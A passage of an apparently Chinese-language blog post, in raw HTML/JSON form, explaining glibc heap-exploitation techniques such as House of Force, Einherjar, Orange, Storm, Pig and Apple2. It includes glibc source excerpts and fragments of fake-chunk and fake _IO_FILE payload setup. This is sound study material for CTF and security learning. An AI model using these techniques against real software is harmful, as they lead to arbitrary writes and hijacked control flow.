class=\"number\">0x2160c0</span>+<span class=\"number\">0x10</span>)  <span class=\"comment\"># vtable=IO_wfile_jumps+0x10 or ...</span></span><br><span class=\"line\">fake_IO_FILE +=p64(<span class=\"number\">0</span>)*<span class=\"number\">6</span></span><br><span class=\"line\">fake_IO_FILE += p64(fake_io_addr+<span class=\"number\">0x40</span>)  <span class=\"comment\"># rax2_addr,wide_data-&gt;vtable</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"House-of-Kiwi-1\"><a href=\"#House-of-Kiwi-1\" class=\"headerlink\" title=\"House of Kiwi\"></a>House of Kiwi</h3><p><a href=\"https://www.anquanke.com/post/id/235598\">https://www.anquanke.com/post/id/235598</a></p>\n","site":{"data":{}},"excerpt":"<p>堆的进阶利用，各种House层出不穷，但都是在基本的attck的基础上进行的。</p>","more":"<h3 id=\"House-of-Spirit\"><a href=\"#House-of-Spirit\" class=\"headerlink\" title=\"House of Spirit\"></a>House of Spirit</h3><p>House of Spirit是一种针对fast bin的利用，通过在目标位置<strong>伪造</strong>fastbin chunk，并让其被释放，从而达到<strong>申请指定地址内存</strong>的目的。</p>\n<p>需要做的就是让目标位置能够被当作一个chunk释放，重点在于<strong>修改指定地址前后的内容使其能绕过free的检测</strong>。</p>\n<p>需要的绕过：</p>\n<ul>\n<li>fake chunk的<strong>ISMMAP位不能为1</strong>，因为 free 时，如果是mmap的chunk，会单独处理。</li>\n<li>fake chunk<strong>地址需要对齐</strong>。</li>\n<li>fake chunk的<strong>size大小需要满足对应的fastbin</strong> 的需求，同时也得<strong>对齐</strong>。</li>\n<li>fake chunk的next chunk的大小<strong>不能小于2 * SIZE_SZ</strong>，同时也<strong>不能大于av-&gt;system_mem</strong> 。</li>\n<li>fake chunk对应的fastbin<strong>链表头部不能是该fake chunk</strong>，即不能构成double free的情况。</li>\n</ul>\n<h3 id=\"House-of-Force\"><a href=\"#House-of-Force\" class=\"headerlink\" title=\"House of Force\"></a>House of Force</h3><p>House of Force是一种针对<strong>top chunk</strong>的利用，当bin中所有的free chunk都不能满足需求时，就会从top chunk中切割，只要切割后top chunk size&gt; MINSIZE，那么就可以切割top chunk分配。</p>\n<p>如果我们能通过一些方法<strong>控制top chunk的size和我们申请的chunk的大小</strong>，那么只要将<strong>top chunk size修改为一个足够大的值</strong>(如-1,unsigned long的最大值)，那么无论多大的size，我们都能分配到，由此实现<strong>任意地址分配</strong>。</p>\n<p>利用条件：</p>\n<ul>\n<li>可以控制top chunk的size</li>\n<li>可以控制申请chunk的大小</li>\n</ul>\n<h3 id=\"House-of-Einherjar\"><a href=\"#House-of-Einherjar\" class=\"headerlink\" title=\"House of Einherjar\"></a>House of Einherjar</h3><p>House of Einherjar是一种针对<strong>后向合并</strong>操作的利用。当一个chunk被释放时，free会首先会利用prev_inuse位检查其物理低地址的chunk是否空闲，如果空闲则会将这两个chunk合并，<strong>利用当前chunk P的指针、prev_size字段和size字段得到新的chunk的地址以及其大小</strong>。</p>\n<p>因此如果我们能<strong>控制prev_size字段和prev_inuse位</strong>，那么我们就可以将新的chunk指向几乎任何位置。而堆溢出、off by one(null)都可以达到这个条件。</p>\n<p>值得注意的是，在合并取出前一个chunk的时候会用到<strong>unlink</strong>，因此需要提前构造好fake chunk来绕过unlink的检查。</p>\n<p>在这里unlink的检查中主要要注意的是：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//检查prev_size和size是否一致</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class=\"number\">0</span>))      </span><br><span class=\"line\">      malloc_printerr (<span class=\"string\">&quot;corrupted size vs. prev_size&quot;</span>);     </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//检查fd和bk</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class=\"number\">0</span>))                      </span><br><span class=\"line\">  malloc_printerr (check_action, <span class=\"string\">&quot;corrupted double-linked list&quot;</span>, P, AV);  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>由于unlink中是利用要取出的chunk P进行验证，因此之后构造fake chunk的next chunk的prev_size即可绕过第一个检查。</p>\n<p>不过无论什么情况，第二个检查则需要构造一下。</p>\n<p>在利用unlink的时候，我们的绕过方式是：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">*(fakeFD+<span class=\"number\">0x18</span>)==P==*(fakeBK+<span class=\"number\">0x10</span>)</span><br><span class=\"line\"><span class=\"comment\">//等价于(64bit)</span></span><br><span class=\"line\">P-&gt;fd=&amp;P<span class=\"number\">-0x18</span></span><br><span class=\"line\">P-&gt;bk=&amp;P<span class=\"number\">-0x10</span></span><br></pre></td></tr></table></figure>\n\n<p>但在这里我们可能不能获取到P的地址，所以我们换个方式:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">P-&gt;fd=P</span><br><span class=\"line\">P-&gt;bk=P</span><br></pre></td></tr></table></figure>\n\n<p>同样可以绕过unlink的检查。</p>\n<p>值得注意的地方：</p>\n<ul>\n<li>需要有溢出漏洞可以写物理相邻的高地址的 prev_size 与 PREV_INUSE 部分。</li>\n<li>我们需要计算目的 chunk 与 p1 地址之间的差，所以需要泄漏地址。</li>\n<li>我们需要在目的 chunk 附近构造相应的 fake chunk，从而绕过 unlink 的检测。</li>\n</ul>\n<h3 id=\"House-of-Lore\"><a href=\"#House-of-Lore\" class=\"headerlink\" title=\"House of Lore\"></a>House of Lore</h3><p>House of Lore好像没什么例子，可能比较少见吧。House of Lore可以实现分配任意指定位置的chunk，从而修改任意地址的内存。利用的前提是需要<strong>控制Small Bin Chunk的bk指针</strong>，并且<strong>控制指定位置chunk的fd指针</strong>。</p>\n<p>主要利用的是small bin中的漏洞。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 获取 small bin 中倒数第二个 chunk 。</span></span><br><span class=\"line\">bck = victim-&gt;bk;</span><br><span class=\"line\"><span class=\"comment\">// 检查 bck-&gt;fd 是不是 victim，防止伪造</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (__glibc_unlikely(bck-&gt;fd != victim)) &#123;</span><br><span class=\"line\">  errstr = <span class=\"string\">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class=\"line\">  <span class=\"keyword\">goto</span> errout;</span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"comment\">// 设置 victim 对应的 inuse 位</span></span><br><span class=\"line\">set_inuse_bit_at_offset(victim, nb);</span><br><span class=\"line\"><span class=\"comment\">// 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来</span></span><br><span class=\"line\">bin-&gt;bk = bck;</span><br><span class=\"line\">bck-&gt;fd = bin;</span><br></pre></td></tr></table></figure>\n\n<p>当malloc的时候，如果申请的范围在small bin chunk内，且需要从small bin获取空闲的chunk时，会执行上面的语句。我们可以发现，如果我们能控制一个small bin chunk的bk指针指向fake chunk，并控制<strong>fake chunk的fd指向该small bin chunk</strong>来绕过检查，那么就可以将这个fake chunk放入small bin，下一次申请就可以申请到fake chunk1。</p>\n<h3 id=\"House-of-Orange\"><a href=\"#House-of-Orange\" class=\"headerlink\" title=\"House of Orange\"></a>House of Orange</h3><p>House of Orange核心就是<strong>通过漏洞利用获得free的效果</strong>（在没有free的程序中）。</p>\n<p>原理是当前堆的<strong>top chunk尺寸不足</strong>以满足申请分配的大小的时候，<strong>原来的top chunk会被释放并被置入unsorted bin中</strong>，通过这一点可以在没有free函数情况下获取到 unsorted bins。此时会<strong>执行sysmalloc来向系统申请更多的空间</strong>。但是对于堆来说有mmap和brk两种分配方式，我们需要<strong>让堆以brk的形式拓展</strong>，之后原有的top chunk会被置于unsorted bin中。</p>\n<p>为了达到目的，我们伪造top chunk size绕过一些检查。</p>\n<ul>\n<li>伪造的 size 必须要对齐到内存页(0x1000)</li>\n<li>size 要大于 MINSIZE(0x10)</li>\n<li>size 要小于之后申请的 chunk size + MINSIZE(0x10)</li>\n<li>size 的 prev inuse 位必须为 1</li>\n</ul>\n<p>当然malloc申请的size也有要求：malloc 的尺寸不能大于mmp_.mmap_threshold（默认128K）</p>\n<p>top chunk size的对齐，top chunk addr + top chunk size后是一个4K对齐的地址（默认页面大小为4K，以4K对齐），因此伪造的top chunk size也要满足此条件，因此只能在原来的基础上增减4K的倍数。</p>\n<p>House of Orange的进一步利用与IO_FILE有关，后续再说。</p>\n<h3 id=\"House-of-Roman\"><a href=\"#House-of-Roman\" class=\"headerlink\" title=\"House of Roman\"></a>House of Roman</h3><p>House of Roman是fast bin attack和unsorted bin attack的结合。该技术用于bypass ALSR（即使有PIE也依旧有效），利用12-bit的爆破来达到获取shell的目的。且仅仅只需要<strong>一个UAF漏洞以及能创建任意大小的chunk</strong>的情况下就能完成利用。常用在没有泄露的程序中。</p>\n<p>主要步骤为：</p>\n<ol>\n<li><p>利用unsorted bin进行低地址覆盖，利用fastbin attack将fd指向malloc_hook-0x23来获取__malloc_hook（爆破）</p>\n</li>\n<li><p>利用unsorted bin attack修改malloc_hook为main_arena</p>\n</li>\n<li><p>利用之前获得的malloc_hook进行低位覆盖，修改malloc_hook为one_gadget</p>\n</li>\n</ol>\n<h3 id=\"House-of-Rabbit\"><a href=\"#House-of-Rabbit\" class=\"headerlink\" title=\"House of Rabbit\"></a>House of Rabbit</h3><p>一种在fast bin中伪造堆块的技术。其利用的是在进行malloc_consolidate时，fast bin中的堆块合并的过程中没有检查size。</p>\n<p>在chunk释放后，通过修改size构造fake chunk或修改fd指向fake chunk，之后通过malloc一个很大的内存，触发malloc_consolidate，由于这个过程中没有对size进行检查，因此fast bin中的chunk会放到对应的small bin中，伪造的fake chunk就变得合法了，由此可以实现overlapping</p>\n<p>不过需要伪造一下next chunk的prev_inuse=1和next next chunk的prev_inuse=1。</p>\n<h3 id=\"House-of-Corrosion\"><a href=\"#House-of-Corrosion\" class=\"headerlink\" title=\"House of Corrosion\"></a>House of Corrosion</h3><p>House of Corrosion利用了**<code>global_max_fast</code>**这个libc中的全局变量，<code>global_max_fast</code>表示最大的fastbin chunk的大小，默认为<code>0x80</code>，在没有初始化堆的情况下为<code>0</code>。改写<code>globla_max_fast</code>可以让程序将更大的chunk视作fast bin chunk，在malloc和free的时候将作为fast bin chunk处理。</p>\n<p><code>fastbinsY</code>中有10个元素，存放大小从<code>0x20~0xb0</code>的chunk，当超出该范围的chunk进入<code>fastbinsY</code>时，就会发生<strong>数组越界</strong>。利用此方法我们可以向<code>fastbinsY</code>后面的内存中写入一个堆地址（通过free），也可以取出后面内存中指针指向的chunk（如果可以malloc该size的话）。</p>\n<p>偏移和要处理的<code>chunk size</code>可以用此式子计算：<code>chunk size = (address-fastbinsY)* 2 + 0x20</code>（这个size包括了<code>header</code>），其中<code>chunk size</code>是处理的<code>chunk</code>的<code>size</code>，<code>address</code>是会写入或<code>malloc</code>的地址，<code>fastbinsY</code>为<code>fastbinsY</code>的地址。</p>\n<ol>\n<li><p><code>free</code>的利用：</p>\n<p> 利用<code>free</code>将<code>chunk</code>放入<code>fastbinsY</code>时的数组越界。当<code>global_max_fast</code>被修改变大后，更大的<code>chunk</code>被视为<code>fast bin chunk</code>，会被放入<code>fastbinsY</code>，如果大小超出<code>0xb0</code>，就会将后面对应的内存视作<code>fastbinsY</code>的一项放入，表现出的结果就是<strong>将释放的<code>chunk</code>的堆地址写入该内存</strong>。</p>\n<p> 值得注意的是，本质上这次写入是<code>fast bin chunk</code>进入<code>fast bin</code>的结果，因此该<code>chunk</code>的**<code>fd</code>位置会保存该内存处原有的指针，<code>chunk</code>的内容会被清空**。</p>\n</li>\n<li><p><code>malloc</code>的利用：</p>\n<p> <code>malloc</code>时更大的<code>chunk</code>被视作<code>fast bin</code>，因此首先在<code>fastbinsY</code>中对应的<code>fast bin</code>中取出<code>chunk</code>，如果大小超出<code>0xb0</code>，自然就会越界，在后面的内存中取出<code>chunk</code>。取出时，会<strong>判断后面内存中指针对应的<code>chunk</code>的<code>size</code>字段是否符合该<code>fast bin</code>的大小，如果符合则可以取出</strong>。</p>\n</li>\n</ol>\n<h3 id=\"House-of-Storm\"><a href=\"#House-of-Storm\" class=\"headerlink\" title=\"House of  Storm\"></a>House of  Storm</h3><p>House_of_storm 可以<strong>在任意地址写出chunk地址,进而把这个地址的高位当作size,可以进行任意地址分配chunk</strong>，也就是可以造成任意地址写。House_of_storm 虽然危害之大，但是其条件也是非常的苛刻。</p>\n<p>条件：</p>\n<ol>\n<li>glibc版本小于2.30,因为2.30之后加入了检查</li>\n<li>需要攻击者在 large_bin 和 unsorted_bin 中分别布置一个chunk 这两个chunk需要在<strong>归位之后处于同一个 largebin 的index中且 unsorted_bin 中的chunk要比 large_bin 中的大</strong></li>\n<li>unsorted bin中的bk指针要可控</li>\n<li>large bin中的bk和bk_nextsize指针要可控</li>\n</ol>\n<p>漏洞发生在unsorted bin chunk放入large bin的过程中。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//unsorted bin attack</span></span><br><span class=\"line\"><span class=\"comment\">//我们控制unsorted_chunk-&gt;bk = fake_chunk</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//unsorted_chunks(av)-&gt;bk = fake_chunk</span></span><br><span class=\"line\">unsorted_chunks(av)-&gt;bk = unsorted_chunk-&gt;bk;</span><br><span class=\"line\"><span class=\"comment\">//fake_chunk+0x10 = unsorted_bin</span></span><br><span class=\"line\">bck-&gt;fd = unsorted_chunks(av);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//放入fast bin的过程中</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span> </span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">                \t如果unsorted_chunk-&gt;size 大于 largbin_chunk-&gt;size，</span></span><br><span class=\"line\"><span class=\"comment\">                \t把unsorted_chunk加入到纵向链表中</span></span><br><span class=\"line\"><span class=\"comment\">                \t我们控制</span></span><br><span class=\"line\"><span class=\"comment\">                \tlarge_chunk-&gt;bk = fake_chunk+0x8 </span></span><br><span class=\"line\"><span class=\"comment\">                \tlarge_chunk-&gt;bk_nextsize=fake_chunk-0x18-5\t</span></span><br><span class=\"line\"><span class=\"comment\">                  -5是因为堆地址常常是0x55或者0x56开头的，-5后可以将其写入size位，而0x56的size可以绕过malloc的检查申请出来</span></span><br><span class=\"line\"><span class=\"comment\">                */</span></span><br><span class=\"line\">                </span><br><span class=\"line\">                 </span><br><span class=\"line\">                unsorted_chunk-&gt;fd_nextsize = largbin_chunk;</span><br><span class=\"line\">                </span><br><span class=\"line\">                <span class=\"comment\">//unsorted_chunk-&gt;bk_nextsize = fake_chunk-0x18-5</span></span><br><span class=\"line\">                unsorted_chunk-&gt;bk_nextsize = largbin_chunk-&gt;bk_nextsize;</span><br><span class=\"line\">                </span><br><span class=\"line\">                largbin_chunk-&gt;bk_nextsize = unsorted_chunk;</span><br><span class=\"line\">                </span><br><span class=\"line\">                <span class=\"comment\">//fake_chunk+0x3 = unsorted_chunk</span></span><br><span class=\"line\">                unsorted_chunk-&gt;bk_nextsize-&gt;fd_nextsize = unsorted_chunk;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"comment\">//bck  = fake_chunk+0x8</span></span><br><span class=\"line\">            bck = largbin_chunk-&gt;bk;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; </span><br><span class=\"line\"></span><br><span class=\"line\">mark_bin(av, unsorted_chunk_index); <span class=\"comment\">//把unsorted_chunk加入到的bin的表示为非空</span></span><br><span class=\"line\"><span class=\"comment\">//把unsorted_chunk加入到large bin的链表中</span></span><br><span class=\"line\"></span><br><span class=\"line\">unsorted_chunk-&gt;bk = bck;</span><br><span class=\"line\">unsorted_chunk-&gt;fd = largbin_chunk;</span><br><span class=\"line\">largbin_chunk-&gt;bk = unsorted_chunk;</span><br><span class=\"line\"><span class=\"comment\">//fake_chunk+0x18 = unsorted_chunk</span></span><br><span class=\"line\">bck-&gt;fd = unsorted_chunk;</span><br></pre></td></tr></table></figure>\n\n<p>具体利用：</p>\n<ol>\n<li>将unsorted bin chunk的bk指向为fake chunk</li>\n<li>将large bin中的bk指针指向fake chunk+0x8，bk_nextsize指向fake chunk-0x18-5（如果target为要写入的目标地址，则fake chunk为target-0x20），来实现victim-&gt;bk_nextsize-&gt;fd_nextsize=victim(实现fake chunk+3=victim) </li>\n<li>通过malloc(0x48)获得fake chunk,借此可以修改target处的内容</li>\n</ol>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">unsorted_bin_chunk-&gt;bk=fake_chunk</span><br><span class=\"line\">large_bin_chunk-&gt;bk=fake_chunk+<span class=\"number\">0x8</span></span><br><span class=\"line\">large_bin_chunk-&gt;bk_nextsize=fake_chunk<span class=\"number\">-0x18</span><span class=\"number\">-5</span></span><br></pre></td></tr></table></figure>\n\n<p>其原理相当于利用large bin将一个堆地址写入任意地址，通过堆地址高位的0x56绕过检测，并将该fake chunk链入unsorted bin，从而实现任意地址malloc。</p>\n<h3 id=\"House-of-Kiwi\"><a href=\"#House-of-Kiwi\" class=\"headerlink\" title=\"House of Kiwi\"></a>House of Kiwi</h3><h3 id=\"House-of-Emma\"><a href=\"#House-of-Emma\" class=\"headerlink\" title=\"House of Emma\"></a>House of Emma</h3><h3 id=\"House-of-Pig\"><a href=\"#House-of-Pig\" class=\"headerlink\" title=\"House of Pig\"></a>House of Pig</h3><p>House of Pig 是一个将 Tcache Statsh Unlink+ Attack 和 FSOP 结合的攻击，同时使用到了 Largebin Attack 进行辅助。主要适用于 libc 2.31 及以后的新版本 libc 并且程序中仅有 calloc 时。</p>\n<p>需要存在 UAF。能执行 abort 流程或程序显式调用 exit 或程序能通过主函数返回。</p>\n<p>利用流程为</p>\n<ol>\n<li><p>进行一个 Tcache Stash Unlink+ 攻击，把地址 __free_hook - 0x10 写入 tcache_pthread_struct。由于该攻击要求__free_hook - 0x8 处存储一个指向可写内存的指针，所以在此之前需要进行一次 large bin attack。</p>\n</li>\n<li><p>再进行一个 large bin attack，修改 _IO_list_all 为一个堆地址，然后在该处伪造 _IO_FILE 结构体。</p>\n</li>\n<li><p>通过伪造的结构体触发 _IO_str_overflow getshell。</p>\n</li>\n</ol>\n<h3 id=\"House-of-Banana\"><a href=\"#House-of-Banana\" class=\"headerlink\" title=\"House of Banana\"></a>House of Banana</h3><p>从glibc 2.28开始，_int_malloc中增加了对unsorted bin的bk的校验，使得unsorted bin attack变得不可行。此时，我们可以考虑使用large bin attack，使用house of strom实现任意地址分配；然而，从glibc2.29开始，检查变得更加严格，house of strom不能用了。不过large bin attack仍可以使用，然而从glibc 2.30开始，常规large bin attack方法也被封堵，不过也能使用。</p>\n<h3 id=\"House-of-Apple\"><a href=\"#House-of-Apple\" class=\"headerlink\" title=\"House of  Apple\"></a>House of  Apple</h3><p>House of Apple在仅使用一次<code>largebin attack</code>并限制读写次数的条件下进行<code>FSOP</code>利用，前提均是已经泄露出<code>libc</code>地址和<code>heap</code>地址。</p>\n<p>使用<code>house of apple</code>的条件为：</p>\n<ol>\n<li>程序从<code>main</code>函数返回或能调用<code>exit</code>函数（触发调用链<code>exit-&gt;fcloseall-&gt;_IO_cleanup-&gt;_IO_flush_all_lockp-&gt;_IO_OVERFLOW</code>)</li>\n<li>能泄露出<code>heap</code>地址和<code>libc</code>地址</li>\n<li>能使用一次<code>largebin attack</code>（FSOP劫持<code>_IO_list_all</code>到伪造的<code>IO_FILE</code>结构体)</li>\n</ol>\n<p>在劫持IO后我们仍可以继续利用某些<code>IO</code>流函数去修改其他地方的值。就离不开<code>IO_FILE</code>的一个成员<code>_wide_data</code>的利用，其在<code>IO_FILE</code>中的偏移是<code>0xa0</code>。通过对伪造<code>_wide_data</code>并将vtable修改为<code>_IO_wstrn_jumps</code>，通过exit函数触发调用链<code>exit-&gt;fcloseall-&gt;_IO_cleanup-&gt;_IO_flush_all_lockp-&gt;_IO_OVERFLOW</code>，实现任意地址写已知（堆）地址（详情见IO_FILE）。</p>\n<p>House of Apple有四种利用思路：</p>\n<ol>\n<li>修改tcache线程变量为已知值，控制tcache bin的分配。</li>\n<li>修改<code>mp_.tcache_bins</code>为很大的值，使得很大的<code>chunk</code>也通过<code>tcachebin</code>去管理。</li>\n<li>修改<code>tls</code>结构体<code>pointer_guard</code>的值为已知值，走House of emma。</li>\n<li>修改<code>global_max_fast</code>全局变量，让大的chunk也能被认为是fast bin chunk。</li>\n</ol>\n<p>可以看到House of Apple主要还是利用<code>_wide_data</code>和<code>_IO_wstrn_jumps</code>中的<code>_IO_OVRFLOW</code>实现<strong>任意地址写已知地址</strong>，用以辅助其他方法劫持程序流。</p>\n<h3 id=\"House-of-Apple2\"><a href=\"#House-of-Apple2\" class=\"headerlink\" title=\"House of  Apple2\"></a>House of  Apple2</h3><p>House of Apple2也是基于劫持<code>_wide_data</code>的利用，与House of Apple的区别在只劫持<code>_wide_data</code>的条件能控制程序的执行流。</p>\n<p>使用<code>house of apple2</code>的条件为：</p>\n<ul>\n<li>已知<code>heap</code>地址和<code>glibc</code>地址</li>\n<li>能控制程序执行<code>IO</code>操作，包括但不限于：从<code>main</code>函数返回、调用<code>exit</code>函数、通过<code>__malloc_assert</code>触发</li>\n<li>能控制<code>_IO_FILE</code>的<code>vtable</code>和<code>_wide_data</code>，一般使用<code>largebin attack</code>去控制</li>\n</ul>\n<p>这次主要利用的是<code>_IO_wide_data</code>中的<code>_wide_vtable</code>，这也是一个虚表，某些函数的执行会调用到其中的函数，调用过程如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> _IO_WIDE_JUMPS(THIS) \\</span></span><br><span class=\"line\"><span class=\"meta\">  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable</span></span><br></pre></td></tr></table></figure>\n\n<p>可以看到这里并<strong>没有对vtable的合法性进行检测</strong>。因此，我们可以劫持<code>IO_FILE</code>的<code>vtable</code>为<code>_IO_wfile_jumps</code>，控制<code>_wide_data</code>为可控的堆地址空间，进而控制<code>_wide_data-&gt;_wide_vtable</code>为可控的堆地址空间。控制程序执行<code>IO</code>流函数调用，最终调用到<code>_IO_Wxxxxx</code>函数即可控制程序的执行流。</p>\n<p>利用思路：</p>\n<p>目前在<code>glibc</code>源码中搜索到的<code>_IO_WXXXXX</code>系列函数的调用只有<code>_IO_WSETBUF</code>、<code>_IO_WUNDERFLOW</code>、<code>_IO_WDOALLOCATE</code>和<code>_IO_WOVERFLOW</code>。其中<code>_IO_WSETBUF</code>和<code>_IO_WUNDERFLOW</code>目前无法利用或利用困难，其余的均可构造合适的<code>_IO_FILE</code>进行利用。</p>\n<p>（1）利用<code>_IO_wfile_overflow</code>控制程序执行流（走<code>_IO_WDOALLOCATE</code>）</p>\n<p>以下利用的前提是要从<code>_IO_flush_all_lockp</code>执行<code>_IO_overflow(fp)</code>，因此伪造的IO_FILE需要满足以下条件：</p>\n<ol>\n<li><code>fp-&gt;_mode&lt;=0</code></li>\n<li><code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code></li>\n</ol>\n<p>调用链如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_IO_wfile_overflow</span><br><span class=\"line\">    _IO_wdoallocbuf</span><br><span class=\"line\">        _IO_WDOALLOCATE</span><br><span class=\"line\">            *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class=\"number\">0x68</span>)(fp)</span><br></pre></td></tr></table></figure>\n\n<p>在<code>_IO_wfile_overflow</code>中需要绕过一些检测，使其成功调用<code>_IO_wdoallocbuf</code>。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">wint_t</span> _IO_wfile_overflow (FILE *f, <span class=\"type\">wint_t</span> wch)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class=\"comment\">/* SET ERROR */</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class=\"line\">      __set_errno (EBADF);</span><br><span class=\"line\">      <span class=\"keyword\">return</span> WEOF;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  <span class=\"comment\">/* If currently reading or no buffer allocated. */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"comment\">/* Allocate a buffer if needed. */</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (f-&gt;_wide_data-&gt;_IO_write_base == <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      _IO_wdoallocbuf (f);<span class=\"comment\">// 需要走到这里</span></span><br><span class=\"line\">      <span class=\"comment\">// ......</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>需要满足<code>_flags &amp; _IO_NO_WRITES==0</code>，<code>_flags &amp; _IO_CURRENTLY_PUTTING==0</code>和<code>_wide_data-&gt;_IO_write_base == 0</code>。</p>\n<p>在<code>_IO_wdoallocbuf</code>函数中需要使其调用</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span 